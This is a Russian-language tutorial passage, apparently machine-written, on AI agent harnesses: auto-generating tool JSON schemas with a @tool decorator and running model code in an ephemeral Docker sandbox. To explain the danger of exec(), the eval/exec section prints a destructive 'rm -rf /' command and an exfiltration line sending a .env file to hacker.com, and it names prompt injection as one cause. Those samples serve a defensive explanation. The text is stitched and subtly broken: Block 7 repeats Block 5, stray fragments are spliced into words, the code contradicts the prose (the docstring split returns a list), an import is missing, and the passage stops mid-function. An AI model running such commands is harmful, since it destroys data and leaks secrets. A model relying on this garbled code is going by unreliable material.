[ 4. IN-MEMORY TOOL REGISTRY (LLM Ready Context) ]
{
 "type": "function",
 "function": {
 "name": "fetch_user_data",
 "description": "Fetches raw user telemetry from the production PostgreSQL database...",
 "parameters": {
 "type": "object",
 "properties": {
 "user_id": {"type": "integer", "description": "Parameter user_id"},
 "include_logs": {"type": "boolean", "description": "Parameter include_logs"}
 },
 "required": ["user_id"]
 }
 }
}
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем production-ready генератор схем без использования тяжелых сторонних фреймворков. Нам понадобятся только стандартные библиотеки Python: `inspect`, `typing` и `docstring_parser` (опционально, но мы напишем собственный парсер для независимости).

#### Шаг 1: Таблица маппинга типов (Type Mapping)
Первым делом мы должны научить Python переводить свои внутренние типы данных в стандарты JSON Schema.

| Тип Python | Тип JSON Schema | Поведение LLM |
|:--- |:--- |:--- |
| `int` | `"integer"` | Модель сгенерирует целое число (например, `42`). |
| `float` | `"number"` | Модель сгенерирует число с плавающей точкой (`3.14`). |
| `str` | `"string"` | Модель сгенерирует текстовую строку (`"query"`). |
| `bool` | `"boolean"` | Модель сгенерирует `true` или `false` (без кавычек). |
| `list` / `List[X]` | `"array"` | Модель сгенерирует массив. |
| `dict` / `Dict` | `"object"` | Модель сгенерирует вложенный JSON-объект. |

#### Шаг 2: Разработка парсера сигнатур и декоратора `@tool`
Этот код выполняет фазу инициализации обвязки агента. Как отмечается в Лекции 06, инициализация проекта перед сессией - это отдельный и критически важный процесс.

```python
import inspect
import logging
from functools import wraps
from typing import Callable, Dict, Any, Type, get_origin, get_args

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SCHEMA_GEN] - %(message)s')

def _python_to_json_type(py_type: Type) -> str:
 """
 Маппинг нативных типов Python в строковые типы JSON Schema.
 Поддерживает базовые типы и сложные структуры из модуля typing.
 """
 # Обработка сложных типов (например, List[str], Dict[str, Any])
 origin = get_origin(py_type)
 if origin is list:
 return "array"
 if origin is dict:
 return "object"
 
 # Обработка базовых типов
 mapping = {
 int: "integer",
 float: "number",
 str: "string",
 bool: "boolean",
 list: "array",
 dict: "object"
 }
 
 # Фолбек на string, если тип неизвестен (для безопасности LLM)
 return mapping.get(py_type, "string")

class DynamicToolRegistry:
 """
 Реестр инструментов, который динамически строит JSON Schema 
 с использованием модуля inspect и AST-парсинга docstring'ов.
 """
 def __init__(self):
 self._tools: Dict[str, Dict[str, Any]] = {}

 def tool(self, name: str = None) -> Callable:
 """
 Декоратор для автоматической регистрации Python-функций.
 Генерирует полную JSON Schema во время импорта (Runtime Init).
 """
 def decorator(func: Callable) -> Callable:
 tool_name = name or func.__name__
 
 # 1. Извлечение Docstring (это наш промпт для ACI)
 raw_docstring = inspect.getdoc(func)
 if not raw_docstring:
 raise ValueError(
 f"CRITICAL HARNESS ERROR: Function '{tool_name}' lacks a docstring. "
 f"Tools require explicit descriptions for the LLM to choose them correctly."
 )
 
 # Очистка docstring от лишних отступов и разбиение (берем только описание)
 clean_description = raw_docstring.strip().split("\n\n")
 
 # 2. Извлечение сигнатуры функции (параметры и их типы)
 sig = inspect.signature(func)
 properties = {}
 required_params = []
 
 for param_name, param in sig.parameters.items():
 # Пропускаем параметры, которые не должны заполняться LLM (например, скрытый контекст)
 if param_name == "hidden_context":
 continue
 
 if param.annotation == inspect.Parameter.empty:
 raise TypeError(f"HARNESS ERROR: Parameter '{param_name}' in '{tool_name}' lacks type hints.")
 
 # Построение схемы для конкретного параметра
 properties[param_name] = {
 "type": _python_to_json_type(param.annotation),
 "description": f"Arg: {param_name} ({param.annotation.__name__})"
 }
 
 # Если у параметра нет значения по умолчанию, он обязателен для LLM
 if param.default == inspect.Parameter.empty:
 required_params.append(param_name)
 
 # 3. Сборка финальной JSON Schema (Формат OpenAI / Anthropic)
 schema = {
 "type": "function",
 "function": {
 "name": tool_name,
 "description": clean_description,
 "parameters": {
 "type": "object",
 "properties": properties,
 "required": required_params
 }
 }
 }
 
 # 4. Регистрация в памяти
 self._tools[tool_name] = {
 "callable": func,
 "schema": schema
 }
 
 logging.info(f"Dynamically generated schema for '{tool_name}'.")
 
 @wraps(func)
 def wrapper(*args, **kwargs):
 return func(*args, **kwargs)
 return wrapper
 
 return decorator

 def get_manifest(self) -> list:
 """Возвращает массив всех схем для передачи в API SDK."""
 return [t["schema"] for t in self._tools.values()]
```

#### Шаг 3: Тестирование динамической генерации
Применим наш декоратор к бизнес-логике. Обратите внимание, как мы пишем 3-4 предложения в docstring, следуя инструкциям по созданию управляемых агентов.

```python
# Инициализация реестра
agent_registry = DynamicToolRegistry()

@agent_registry.tool(name="query_crm_database")
def get_customer_ltv(email: str, include_purchase_history: bool = False) -> str:
 """
 Fetches the Lifetime Value (LTV) and account status of a customer from the CRM.
 Use this tool ONLY when the user specifically asks for financial metrics or purchase history.
 Do NOT use this tool for general support queries.
 """
 # Заглушка выполнения бизнес-логики
 history_msg = "with history" if include_purchase_history else "without history"
 return f"Customer {email} has LTV of $4,500 ({history_msg})."

@agent_registry.tool()
def search_internal_confluence(query: str, max_results: int) -> str:
 """
 Searches the internal company Confluence wiki for engineering documentation.
 Use this tool to discover architecture details, API endpoints, or company policies.
 """
 return f"Search results for {query}..."

# Вывод сгенерированных JSON-схем
if __name__ == "__main__":
 import json
 manifest = agent_registry.get_manifest()
 print(json.dumps(manifest, indent=2))
```

Когда этот скрипт запускается, он автоматически парсит функции и выводит идеальный, безошибочный JSON, готовый к отправке в OpenAI или Anthropic. Разработчику больше никогда не придется писать фигурные скобки вручную.

---

### Реальные бизнес-применения и юнит-экономика

Переход на динамические схемы - это не просто «синтаксический сахар». Это архитектурное требование для систем, которые генерируют реальную прибыль.

**1. Интеграция с n8n и No-Code платформами**
В статьях Хабра часто упоминается, что для сложных проектов базовых возможностей n8n не хватает. Представьте, что вы разрабатываете кастомный ИИ-узел для корпоративного клиента. Клиент просит добавить 50 различных инструментов для работы с их внутренней 1С и ERP. Хардкодить 50 JSON-схем в JavaScript/Python узлах n8n займет недели и приведет к постоянным багам при изменениях API. Используя `DynamicToolRegistry`, вы просто пишете 50 коротких Python-функций. Декоратор `@tool` собирает их в единый REST API манифест (`/tools/schemas`), который n8n забирает одним HTTP-запросом. Это превращает разработку за $10,000 из хаоса в детерминированный, управляемый процесс.

**2. Мульти-агентные рои (Swarm Architecture)**
Как мы обсуждали в паттерне *Orchestrator-Worker*, лид-агент может спавнить субагентов для различных задач. Если у вас есть 10 специализированных субагентов (QA, Кодер, Ресерчер), каждый из них нуждается в своем уникальном наборе инструментов. Динамическая генерация схем позволяет обвязке фильтровать инструменты на лету: `registry.get_manifest(category="qa_tools")`. Это кардинально снижает Context Bloat, гарантируя, что субагент-ресерчер никогда не увидит схему деструктивного инструмента `drop_database`, что является основой песочниц и безопасности.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Генерация схем из кода - мощный паттерн, но он подвержен строгим ограничениям среды выполнения (Runtime).

> [!CAUTION] 
> **Иллюзия опциональности (Missing Default Values)** 
> **Ошибка:** Разработчик пишет функцию `def send_email(address: str, cc_address: str):` и забывает указать дефолтное значение для `cc_address`. Динамический парсер делает оба поля обязательными (`required: ["address", "cc_address"]`). LLM, пытаясь отправить письмо только одному человеку, начинает галлюцинировать и придумывать фейковый `cc_address`, просто чтобы удовлетворить жесткую JSON Schema. 
> **Harness Mitigation:** Архитектор должен проектировать функции с четким пониманием ACI. Если параметр опционален для бизнес-логики, он **обязан** иметь значение по умолчанию в Python: `cc_address: str = None`. Парсер считает это и исключит поле из массива `required`, позволяя модели пропустить его генерацию.

> [!WARNING] 
> **Docstring Bloat (Переполнение токенов описания)** 
> **Проблема:** Стремясь дать агенту максимум контекста, разработчик вставляет в docstring 500 строк технических деталей работы ERP-системы. Парсер берет весь текст и засовывает его в `description`. Когда схема отправляется в LLM, она сжигает 2000 токенов только на описание одного инструмента. 
> **Диагностическая петля:** В нашем коде `DynamicToolRegistry` реализован критический паттерн сжатия: `raw_docstring.strip().split("\n\n")`. Обвязка берет только первый, верхнеуровневый параграф документации для описания инструмента. Подробные технические спецификации должны оставаться в `references/` и вызываться агентом через инструмент `read_file` (паттерн Progressive Disclosure).

> [!NOTE] 
> **Слепые зоны типизации (Type Hinting Failures)** 
> Если функция определена как `def process_data(payload):` (без Type Hints), LLM не знает, что передавать - строку, число или JSON. Обвязка должна немедленно выкидывать исключение `TypeError` прямо во время запуска приложения (Fail-Fast), заставляя инженера исправить код, прежде чем пускать агента в цикл рассуждений. Как гласит правило Harness Engineering: «Строгие ограничения лучше микроменеджмента».

> [!TIP]
> **Авто-исправление ошибок агента (Self-Healing)**
> Даже с идеальной схемой модель может ошибиться в параметрах. Лекция 10 настаивает: сообщения об ошибках должны включать инструкции по исправлению. Если LLM передает невалидный JSON, не крашьте Python. Верните в цикл строку: `"Tool Validation Error: Missing required parameter 'user_id'. Please review the tool schema and try again."` Агент прочитает это и сам исправит свой вызов.

Реализовав автоматическое построение JSON-схем, вы навсегда стерли границу между детерминированным кодом и языковыми моделями. Вы создали самодокументирующуюся систему, которая гарантирует, что возможности вашего агента всегда идеально синхронизированы с вашим исходным кодом.

Готовы ли вы перейти к Блоку 6, где мы рассмотрим продвинутые мульти-агентные паттерны оркестрации и научим наших агентов делегировать задачи друг другу?

---

## Блок 6: Изоляция окружения — управление зависимостями при вызове скриптов инструментами.

Добро пожаловать в шестой блок одиннадцатой недели. В предыдущих главах мы разработали систему динамической рефлексии для генерации JSON-схем и научились оборачивать наши Python-функции в микросервисы FastAPI. Наш агент получил зрение (поиск), руки (файловые инструменты) и даже способность восстанавливаться после падений (Rate Limit Resiliency). Но мы подошли к самому опасному рубежу в разработке AI-агентов.

Агенты пишут код. Агенты хотят его выполнять. И если вы позволите языковой модели выполнять сгенерированный код прямо на вашей локальной машине или рабочем сервере, вы создадите уязвимость колоссальных масштабов. 

В Фазе 5 фундаментального роадмапа AI-инженера (Production hardening) сформулировано абсолютно необсуждаемое правило: «Безопасность и песочницы. Все code execution – в песочнице: Modal, E2B, Daytona, LangSmith Sandboxes... Никогда не делайте exec() выхода модели в основном процессе». 

В этом исчерпывающем, монументальном глубоком погружении мы разберем **Изоляцию окружения (Environment Isolation) и управление зависимостями (Dependency Management)**. Мы изучим физику песочниц, поймем, как динамически предоставлять агентам Python-пакеты (например, `pandas` или `numpy`), не ломая хост-систему, и спроектируем энтерпрайз-песочницу, строго следуя принципам прав, папок и сетей.

---

### Глубокий теоретический анализ: Физика песочниц и зависимостей

Прежде чем писать код безопасного выполнения, архитектор должен понять, как работают современные среды для AI-кодинга. Как отмечает *The Anatomy of an Agent Harness*, полноценная обвязка (harness) включает в себя «Bundled Infrastructure (filesystem, sandbox, browser)» и способность «Setup environments and install packages to complete work».

#### 1. Смертельная ловушка `eval()` и `exec()`
Самая частая и фатальная ошибка Junior ИИ-инженеров - это реализация инструмента `run_python`, который берет строку кода от LLM и передает ее в нативную Python-функцию `exec()`. 
Если модель галлюцинирует (или если пользователь совершает Prompt Injection атаку), агент может сгенерировать код `import os; os.system("rm -rf /")` или `requests.post("hacker.com", data=open(".env").read())`. Поскольку `exec()` выполняется в том же процессе памяти, что и ваш оркестратор, агент имеет полный доступ к вашим корневым директориям и переменным окружения. Именно поэтому роадмап категоричен: «Учетки никогда не попадают в контекст... Никогда не делайте exec() выхода модели в основном процессе». 

#### 2. Принципы прав, папок и сетей
В материалах, собранных из сообщества на Хабре, четко сказано: «Безопасность обычно не такая страшная, как кажется, и решается правильной организацией среды... Принципы прав / папок / сети».
* **Права:** Процесс выполнения кода должен запускаться от имени пользователя `nobody` или внутри контейнера без root-доступа.
* **Папки:** Инструмент выполнения должен иметь доступ только к смонтированной (bind-mount) виртуальной директории (виртуальной файловой системе), изолированной от хоста.
* **Сеть:** Код агента часто нуждается в сети (например, для загрузки датасетов), но доступ к внутренним IP-адресам AWS/VPC должен быть заблокирован (защита от SSRF).

#### 3. Управление динамическими зависимостями
Настоящая магия кодинг-агентов заключается в их способности использовать библиотеки. Агент может решить построить график, используя `matplotlib`, или проанализировать таблицу через `pandas`. Как harness предоставляет эти зависимости? 
Вы не можете заранее установить все библиотеки Python (их более 500 000 в PyPI) в образ Docker. Вместо этого инструмент выполнения кода должен поддерживать инъекцию зависимостей: он должен принимать от агента не только сам `code`, но и массив `dependencies`, динамически выполняя `pip install` перед запуском скрипта.

#### 4. Целостность сессии и очистка (Clean State)
Как сказано в *Лекции 12. Каждая сессия должна оставлять чистое состояние*: «Следующая сессия агента стартует и сразу обнаруживает: сборка сломана, тесты красные, повсюду временные дебаг-файлы...». Песочница (sandbox) для выполнения кода должна быть эфемерной. После завершения сессии контейнер должен быть физически уничтожен вместе со всеми временными файлами, гарантируя принцип идемпотентности: «Операции очистки дают тот же результат независимо от того, сколько раз они выполняются».

---

### Архитектурная схема ASCII: Инфраструктура Изолированного Выполнения

Следующий направленный ациклический граф (DAG) иллюстрирует паттерн "Code execution with MCP" или изолированного выполнения, где мозг (агент) отделен от рук (среды выполнения).

```ascii
=============================================================================================
 ENTERPRISE AGENT SANDBOX & ISOLATION HARNESS
=============================================================================================

[ 1. ReAct ORCHESTRATOR AGENT ]
Thought: "I need to analyze sales.csv and plot a histogram."
Action: {
 "name": "execute_python", 
 "arguments": {
 "code": "import pandas as pd\ndf = pd.read_csv('sales.csv')...",
 "dependencies": ["pandas", "matplotlib"]
 }
}
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. TOOL DISPATCH & SECURITY BROKER |
| - Validates JSON schemas. |
| - Strips internal environment variables (Zero-Trust). |
+-----------------------------------------------------------------------------------------+
 |
 v
+=========================================================================================+
| 3. EPHEMERAL DOCKER SANDBOX (e.g., Modal, E2B, or Local Docker SDK) |
| |
| [ 3A. DEPENDENCY RESOLUTION ] |
| $ pip install pandas matplotlib --quiet --disable-pip-version-check |
| |
| [ 3B. EXECUTION WITHIN CHROOT/JAIL ] |
| - Runs `python agent_script.py` |
| - CPU & Memory constraints applied (cgroups). |
| - Timeout enforced (e.g., 60 seconds) to prevent infinite while loops. |
+=========================================================================================+
 |
 (Timeout / Memory Limit) \ / (Success: stdout / stderr)
 v v
+-----------------------------------------------------------------------------------------+
| 4. OBSERVABILITY & DIAGNOSTIC RETURN |
| - Captures STDOUT and STDERR. |
| - Compresses massive outputs (Filesystem Offload). |
| - Destroys Ephemeral Sandbox (Clean State). |
| - Returns safe text observation back to LLM. |
+-----------------------------------------------------------------------------------------+
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем production-ready инструмент `execute_python`, который использует библиотеку `docker` для локальной изоляции. Вместо вызова `exec()`, этот инструмент:
1. Создает временную директорию (workspace).
2. Записывает туда код агента.
3. Поднимает эфемерный Docker-контейнер `python:3.11-slim`.
4. Динамически устанавливает запрошенные зависимости.
5. Выполняет код со строгими ограничениями по времени и памяти.
6. Возвращает `stdout` и `stderr`, после чего уничтожает контейнер.

> [!NOTE] 
> Для запуска этого кода у вас должен быть установлен Docker Engine на хост-машине, а в виртуальном окружении должен стоять пакет `docker` (`pip install docker`).

#### Шаг 1: Инструмент изолированного выполнения (Sandbox Tool)

```python
import os
import tempfile
import logging
import docker
from docker.errors import ContainerError, ImageNotFound, APIError
from typing import List, Dict, Any

# "Сделайте рантайм агента наблюдаемым" (Make agent runtime observable)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SANDBOX_HARNESS] - %(message)s')

class SecurePythonSandbox:
 """
 Enterprise-grade Python execution sandbox using Docker.
 Prevents 'exec()' vulnerabilities and implements ephemeral, clean-state sessions.
 """
 def __init__(self):
 try:
 self.client = docker.from_env()
 # Убеждаемся, что базовый образ доступен
 self.client.images.pull("python:3.11-slim")
 except Exception as e:
 logging.critical(f"Failed to initialize Docker Sandbox: {e}")
 raise

 def execute(self, code: str, dependencies: List[str] = None, timeout_seconds: int = 30) -> str:
 """
 Executes arbitrary Python code in a secure, isolated container.
 """
 dependencies = dependencies or []
 
 # Лекция 12: "Каждая сессия должна оставлять чистое состояние".
 # Используем tempfile для автоматической очистки хост-директории
 with tempfile.TemporaryDirectory() as temp_dir:
 script_path = os.path.join(temp_dir, "agent_script.py")
 with open(script_path, "w", encoding="utf-8") as f:
 f.write(code)
 
 # Формируем shell-команду для установки зависимостей (если есть) и запуска кода
 if dependencies:
 # Санитаризация: удаляем возможные инъекции shell-команд в названиях пакетов
 safe_deps = [dep for dep in dependencies if dep.replace("-", "").replace("_", "").isalnum()]
 deps_str = " ".join(safe_deps)
 command = f"sh -c 'pip install {deps_str} --quiet && python /workspace/agent_script.py'"
 else:
 command = "python /workspace/agent_script.py"

 logging.info(f"Spawning secure sandbox. Dependencies: {dependencies}")

 try:
 # Запуск эфемерного контейнера с ограничениями
 container = self.client.containers.run(
 image="python:3.11-slim",
 command=command,
 volumes={temp_dir: {'bind': '/workspace', 'mode': 'rw'}},
 working_dir="/workspace",
 detach=True, # Запускаем в фоне для контроля таймаута
 network_disabled=False, # Разрешаем сеть для pip install
 mem_limit="256m", # Ограничение памяти (предотвращает OOM-атаки)
 nano_cpus=1000000000, # Ограничение CPU (1 ядро)
 user="1000:1000" # Запуск не от root (Принципы прав)
 )

 # Ожидание завершения с жестким таймаутом
 try:
 result = container.wait(timeout=timeout_seconds)
 stdout = container.logs(stdout=True, stderr=False).decode("utf-8")
 stderr = container.logs(stdout=False, stderr=True).decode("utf-8")
 
 exit_code = result.get("StatusCode", -1)
 
 # Диагностическая петля: возвращаем и stdout, и stderr для самовосстановления агента
 observation = f"Exit Code: {exit_code}\n"
 if stdout: observation += f"--- STDOUT ---\n{stdout}\n"
 if stderr: observation += f"--- STDERR ---\n{stderr}\n"
 
 return observation.strip()

 except requests.exceptions.ReadTimeout: # Из внутренней библиотеки docker
 container.kill()
 error_msg = f"SECURITY TIMEOUT: Script execution exceeded {timeout_seconds} seconds and was killed. Infinite loop detected."
 logging.warning(error_msg)
 return error_msg

 except ContainerError as e:
 # Ошибка внутри контейнера (например, SyntaxError)
 return f"Execution Error:\n{e.stderr.decode('utf-8')}"
 except Exception as e:
 return f"System Infrastructure Error: {str(e)}"
 finally:
 # Уборка контейнера: "Уберем потом означает никогда не убираем".
 try:
 container.remove(force=True)
 except:
 pass

# Инициализация синглтона песочницы
sandbox_env = SecurePythonSandbox()
```

#### Шаг 2: Регистрация инструмента в Tool Registry
Теперь мы регистрируем этот инструмент в нашей системе динамических схем (из Блока 5), предоставляя модели четкий контракт (Type Hints + Docstring).

```python
# from core.registry import dynamic_tool 

@dynamic_tool(namespace="env")
def run_python_code(code: str, required_packages: List[str] = None) -> str:
 """
 Executes Python code in a secure, isolated Docker sandbox.
 Use this tool to perform complex data analysis, calculations, or string manipulation
 that is too difficult for a language model to do purely in its head.
 
 CRITICAL RULES:
 1. You cannot use 'input()' or interactive prompts. The code must be fully automated.
 2. Print your final results using 'print()' so they are captured in STDOUT.
 3. If you need external libraries (e.g., 'numpy', 'requests'), list them in required_packages.:param code: The raw Python script string to execute.:param required_packages: A list of pip package names required by your script.
 """
 # Вызываем нашу песочницу
 return sandbox_env.execute(code=code, dependencies=required_packages, timeout_seconds=45)
```

---

### Реальные бизнес-применения и юнит-экономика

Изоляция окружения - это то, что отличает генератор текста от автономного инженера данных.

**1. AI Аналитик Данных (Advanced Data Analysis)**
В enterprise-архитектурах, таких как CREAO (платформа на 25 сотрудников), агентные системы перестраивают инженерный процесс. Когда бизнес-пользователь просит: «Проанализируй базу клиентов `users.csv` и найди корреляцию между оттоком и возрастом», агент не пытается читать весь гигабайтный CSV в свое контекстное окно (это приведет к крашу 400 BadRequest и астрономическим счетам). 
Вместо этого агент пишет Python-скрипт с использованием `pandas` и `scikit-learn`, запрашивает эти зависимости в `required_packages`, и передает скрипт в инструмент `run_python_code`. Песочница загружает библиотеки, обрабатывает гигабайт данных в оперативной памяти Docker-контейнера и возвращает агенту только 5 строк математических выводов через `stdout`. Вы только что сэкономили $50 на токенах, потратив 1 цент на CPU-время контейнера.

**2. Автоматическое ревью кода и тестирование (Сценарий SWE-bench)**
Как отмечено в *Лекции 10. Только сквозное тестирование - настоящая верификация*: «Юнит-тесты пройдены ≠ Задача завершена». Агент-кодер (SWE-Agent) пишет фичу. Затем он вызывает песочницу, передавая скрипт `pytest --cov=src`. Песочница скачивает зависимости, запускает тесты и возвращает покрытие кода. Если код содержит `SyntaxError` или падает с `IndexError`, ошибка безопасно ловится chroot-окружением песочницы, не ломая хост-машину, а точный traceback из `stderr` (та самая красная пометка для агента ) возвращается модели для диагностической петли (Diagnostic Loop) автоисправления.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Выполнение сгенерированного кода в песочницах - это минное поле краевых случаев.

> [!CAUTION] 
> **Ловушка бесконечного цикла (The Infinite While Loop)** 
> **Ошибка:** Модель генерирует код: `while True: pass`, пытаясь написать демо-скрипт. Если вы запускаете это через простой `subprocess.run()`, процесс забирает 100% CPU и зависает навсегда. Вся архитектура обвязки агента замирает. 
> **Harness Mitigation:** Именно поэтому в коде Docker-песочницы мы использовали жесткий `container.wait(timeout=timeout_seconds)`. Если скрипт превышает 30 секунд, мы насильно шлем SIGKILL (kill) контейнеру и возвращаем агенту: `"SECURITY TIMEOUT... Infinite loop detected."` Агент читает эту диагностическую обратную связь, извиняется и переписывает алгоритм без бесконечного цикла.

> [!WARNING] 
> **Галлюцинации зависимостей (Dependency Hell)** 
> **Проблема:** Агент импортирует библиотеку `bs4` (BeautifulSoup), но В источниках указывает `"beautifulsoup"`. `pip install beautifulsoup` падает (правильное название - `beautifulsoup4`). 
> **Диагностическая петля:** Песочница вернет ошибку `pip install`. Согласно правилу OpenAI из *Лекции 09*, «сообщения об ошибках для агентов должны включать инструкции по исправлению». Вывод `stderr` покажет `ERROR: Could not find a version that satisfies the requirement beautifulsoup`. Агент, обладающий знаниями о Python, рефлексирует, осознает свою ошибку, меняет зависимость на `beautifulsoup4` и совершает повторный вызов инструмента (Retry). Это и есть магия самовосстанавливающихся (Self-Healing) агентов.

> [!NOTE] 
> **Загрязнение песочницы (State Leakage)** 
> Если вы используете одну и ту же запущенную Docker-контейнер для всей сессии агента (Stateful Jupyter Kernel), агент может определить глобальную переменную `x = 10`, а через 20 шагов случайно использовать ее, даже не объявляя в новом скрипте. Это нарушает воспроизводимость (Reproducibility). Как учит *Лекция 12*, «Уберем потом означает никогда не убираем». Архитектурно безопаснее использовать строго эфемерные песочницы (Stateless Sandbox), где каждый вызоВ источниках поднимает чистый контейнер. Если агенту нужно передать данные между вызовами, он должен записать их в файл на смонтированном `volume` (виртуальной ФС).

Обернув выполнение кода в Docker-песочницу с динамическим разрешением зависимостей и лимитами ресурсов, вы окончательно разорвали связь между уязвимой хост-системой и непредсказуемой языковой моделью. Ваш агент теперь может математически доказывать свои мысли, скрейпить веб-страницы через Playwright и строить Data Science графики, оставаясь в строгих архитектурных рамках (Harness Constraints).

Освоив изоляцию окружения, вы готовы к переходу к Блоку 7 - продвинутым методикам Memory Management, где мы научимся передавать состояние между этими эфемерными изолированными песочницами!

---

## Блок 7: Разработка кастомных декораторов @tool для автогенерации схем функций на основе сигнатуры.

Любой агент - это просто while true цикл, который берет твой ввод и «продолжает» его с помощью LLM. Если в ответе есть запрос на вызов инструмента (tool), то вызываем и результат отправляем обратно в llm. На этой простой механике строятся сложнейшие когнитивные архитектуры. Однако фундаментальная проблема возникает на стыке между языковой моделью и исполняемым кодом: как именно агент узнает, какие аргументы принимает ваша функция? 

В Фазе 3 фундаментального роадмапа AI-инженера («Соберите слой обвязки сами») зафиксировано абсолютно необсуждаемое архитектурное требование: вам необходимо реализовать «Реестр инструментов через декоратор Python ( `@tool` ) с автогенерацией JSON-schema». Жесткое хардкодирование JSON-словарей для каждого инструмента - это путь к техническому долгу, рассинхронизации между кодом и документацией, и, как следствие, к фатальным галлюцинациям модели.

В этом исчерпывающем, монументальном глубоком погружении мы навсегда избавимся от ручного написания JSON. Мы спроектируем систему динамической рефлексии (Reflection) на Python, которая будет «на лету» читать сигнатуры ваших функций (Type Hints) и их документацию (Docstrings), автоматически транслируя детерминированный код в строгие OpenAPI/JSON инструкции для LLM.

---

### Глубокий теоретический анализ: Физика Agent-Computer Interface (ACI)

Прежде чем писать код генератора схем, архитектор должен понять, как языковая модель «видит» ваш инструмент. LLM не умеет читать исходный код функции. Единственное, на что она опирается при принятии решения - это сгенерированная вами JSON-схема.

#### 1. Репозиторий как спецификация (Repo as Spec)
В Лекции 03 («Сделайте репозиторий своим единственным источником истины») подчеркивается: информации, которой нет в репо, для агента не существует. Если ваша Python-функция требует `user_id: int`, а захардкоженная вручную JSON-схема всё ещё говорит LLM передавать `string`, возникает фатальный сбой, который разрушает доверие модели к среде исполнения (Harness-Induced Failure). 
Автоматическая генерация схем из сигнатуры функции гарантирует выполнение принципа «repo as spec». Ваш код буквально становится вашей спецификацией. Изменение типа переменной в коде автоматически обновляет контекст для агента.

#### 2. Docstring как системный промпт
В классической разработке docstring - это подсказка для программиста. В инженерии агентов docstring - это системный промпт. Как указывают инструкции Anthropic, описания инструментов и параметров – это инструкция к LLM. Автоматический парсинг docstring позволяет извлекать описания и встраивать их в поле `description` JSON-схемы инструмента. Если описания нет, модель начнет додумывать логику работы функции, что неизбежно приведет к ошибкам.

#### 3. Семантическая трансляция типов (Type Hinting Mapping)
Как гласят материалы для AI Automation Builders: «Каждая автоматизация, которую вы когда-либо построите, соединяет две системы через API». Чтобы LLM могла корректно обратиться к вашему локальному Python-инструменту или внешнему API, мы должны перевести нативные аннотации типов Python (например, `int`, `str`, `bool`) в универсальный формат «API, вебхуки и JSON (словарь, а не код)». Наш декоратор будет использовать встроенный модуль `inspect`, чтобы спуститься на уровень абстрактного синтаксического дерева, извлечь типы и построить валидный JSON.

---

### Архитектурная схема ASCII: Конвейер динамической генерации схем

Следующий направленный ациклический граф (DAG) демонстрирует, как Python-код во время фазы инициализации обвязки (Runtime Initialization) превращается в готовую для LLM структуру.

```ascii
=============================================================================================
 ENTERPRISE DYNAMIC SCHEMA GENERATOR HARNESS
=============================================================================================

[ 1. DEVELOPER WORKSPACE (Python Code) ]
@tool(category="database")
def fetch_user_data(user_id: int, include_logs: bool = False) -> str:
 """
 Fetches raw user telemetry from the production PostgreSQL database.:param user_id: The unique integer ID of the user.:param include_logs: Whether to append historical action logs.
 """
 | (Runtime Initialization)
 v
+-----------------------------------------------------------------------------------------+
| 2. REFLECTION & PARSING LAYER (`inspect` module) |
| -> Extracts Function Name: `fetch_user_data` |
| -> Parses Docstring: "Fetches raw user telemetry..." |
| -> Extracts Signature: `user_id` (Type: int, Required: Yes) |
| -> Extracts Signature: `include_logs` (Type: bool, Required: No, Default: False) |
+-----------------------------------------------------------------------------------------+
 |
 v
+-----------------------------------------------------------------------------------------+
| 3. JSON SCHEMA TRANSLATOR (Type Mapping) |
| -> Maps Python `int` to JSON Schema `{"type": "integer"}` |
| -> Maps Python `bool` to JSON Schema `{"type": "boolean"}` |
| -> Constructs OpenAPI/Anthropic compliant payload. |
+-----------------------------------------------------------------------------------------+
 |
 v
[ 4. IN-MEMORY TOOL REGISTRY (LLM Ready Context) ]
{
 "type": "function",
 "function": {
 "name": "fetch_user_data",
 "description": "Fetches raw user telemetry from the production PostgreSQL database.",
 "parameters": {
 "type": "object",
 "properties": {
 "user_id": {"type": "integer", "description": "The unique integer ID of the user."},
 "include_logs": {"type": "boolean", "description": "Whether to append historical action logs."}
 },
 "required": ["user_id"]
 }
 }
}
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем production-ready генератор схем без использования тяжелых сторонних фреймворков. Нам понадобятся только стандартные библиотеки Python: `inspect`, `re` и `typing`.

#### Шаг 1: Таблица маппинга типов (Type Mapping)
Первым делом мы должны научить Python переводить свои внутренние типы данных в стандарты JSON Schema.

| Тип Python | Тип JSON Schema | Поведение LLM |
|:--- |:--- |:--- |
| `int` | `"integer"` | Модель сгенерирует целое число (например, `42`). |
| `float` | `"number"` | Модель сгенерирует число с плавающей точкой (`3.14`). |
| `str` | `"string"` | Модель сгенерирует текстовую строку (`"query"`). |
| `bool` | `"boolean"` | Модель сгенерирует `true` или `false` (без кавычек). |
| `list` | `"array"` | Модель сгенерирует массив. |

#### Шаг 2: Разработка парсера сигнатур и декоратора `@tool`

```python
import inspect
import re
import logging
from functools import wraps
from typing import Callable, Dict, Any, Type, get_origin, get_args

# Следуя правилу из Лекции 11: "Сделайте рантайм агента наблюдаемым"
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SCHEMA_GEN] - %(message)s')

def _python_to_json_type(py_type: Type) -> str:
 """
 Маппинг нативных типов Python в строковые типы JSON Schema.
 """
 # Обработка сложных типов (например, List[str], Optional[int])
 if get_origin(py_type):
 args = get_args(py_type)
 if type(None) in args: # Опциональные типы
 py_type = next(t for t in args if t is not type(None))
 elif get_origin(py_type) is list:
 return "array"
 elif get_origin(py_type) is dict:
 return "object"
 
 mapping = {
 int: "integer", float: "number", str: "string", bool: "boolean",
 list: "array", dict: "object"
 }
 return mapping.get(py_type, "string") # Фолбек на string

def _parse_docstring_params(docstring: str) -> Dict[str, str]:
 """Извлекает описания конкретных параметров из docstring."""
 if not docstring: return {}
 params = {}
 pattern = re.compile(r":param\s+(?P<name>\w+):\s+(?P<desc>.*)")
 for line in docstring.split('\n'):
 match = pattern.search(line.strip())
 if match: params[match.group('name')] = match.group('desc')
 return params

class DynamicToolRegistry:
 """Реестр инструментов, динамически строящий JSON Schema."""
 def __init__(self):
 self._tools: Dict[str, Dict[str, Any]] = {}

 def tool(self, name: str = None) -> Callable:
 """
 Декоратор для автоматической генерации JSON-схемы из функции.
 """
 def decorator(func: Callable) -> Callable:
 tool_name = name or func.__name__
 
